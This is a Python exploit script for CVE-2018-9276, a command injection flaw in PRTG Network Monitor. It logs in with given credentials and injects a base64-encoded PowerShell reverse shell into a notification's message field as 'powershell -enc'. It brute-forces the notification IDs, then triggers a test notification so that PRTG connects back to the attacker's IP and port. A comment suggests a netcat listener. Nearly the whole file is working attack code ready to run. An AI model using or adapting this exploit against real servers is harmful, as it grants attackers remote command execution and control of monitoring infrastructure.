# CVE-2018-9276 PRTG COMMAND INJECTION
#Simple PoC of RCE vulnerability in PRTG network monitor
#for more stable shell use nishang/Shells/Invoke-PowerShellTcp.ps1
#TESTED ON 18.1.37.13946 VERSION 
#nc -nlvp 80


import requests
import codecs
import sys
import subprocess

if len(sys.argv) < 5:
    print ("(+) usage: %s <target> <user:pass> <yourIP> <yourPORT>" % sys.argv[0])
    print("(+) eg:    %s 10.10.10.10 admin:admin 10.10.10.145 80" % sys.argv[0])
    sys.exit(-1)

target = sys.argv[1]
yourip=sys.argv[3]
yourPORT=sys.argv[4]


try:
    user   = sys.argv[2].split(":")[0]
    pswd   = sys.argv[2].split(":")[1]
except:
    print("(-) username and password needs to be in the format \"user:pass\"")
    sys.exit(-1)


#creating decoded reverse shell
reverse_str = "$client = New-Object System.Net.Sockets.TCPClient('"+yourip+"',"+yourPORT+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

#saving to file
text_file=open("tmp.ps1","w")
n = text_file.write(reverse_str)
text_file.close()
cmd = "cat tmp.ps1 | iconv -t UTF-16LE | base64 -w0"
ps=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
bmessagedata = ps.communicate()[0]

#transform bmessagedata to string
smessagedata = bmessagedata.decode("utf-8")
cmd = "rm tmp1"
ps=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)


# proxies = { 'http': 'http://127.0.0.1:8080' }# use proxy if needed

s=requests.Session()

data = {
    'loginurl':'',
    'username':user,
    'password':pswd
    }

#r=s.post("http://%s/public/checklogin.htm" % target, data=data, allow_redirects=False, proxies=proxies)# use proxy if needed
r=s.post("http://%s/public/checklogin.htm" % target, data=data, allow_redirects=False)

if r.status_code ==302:
    print("Login succesfull")
    
#prepering exploit notification
headers = {
    'X-Requested-With': 'XMLHttpRequest'
    }
id_brute=300
data = {
    'name_':'hahaxd',
    'active_10':'0',
    'active_10':'10',
    'address_10':'Demo EXE Notification - OutFile.ps1',
    'message_10=':'asd | powershell -enc ' + smessagedata,
    'id':id_brute,
    'targeturl':'/myaccount.htm?tabid=2'
    }
for i in range(300,310,1): #edit if needed
    #r=s.post("http://%s/editsettings" % target, data=data, allow_redirects=False, proxies=proxies, headers=headers)# use proxy if needed
    r=s.post("http://%s/editsettings" % target, data=data, allow_redirects=False, headers=headers)
    id_brute=i
    print("id: "+str(id_brute))
    if r.status_code == 200:
        print("Notification found with id of %s, edditing settings" %i)
        break;



data = {
    'id':id_brute
    }

#r=s.post("http://%s/api/notificationtest.htm" % target, data=data, allow_redirects=False, proxies=proxies)# use proxy if needed
r=s.post("http://%s/api/notificationtest.htm" % target, data=data, allow_redirects=False)

if r.status_code == 200:
    print("Shell incoming !!!")
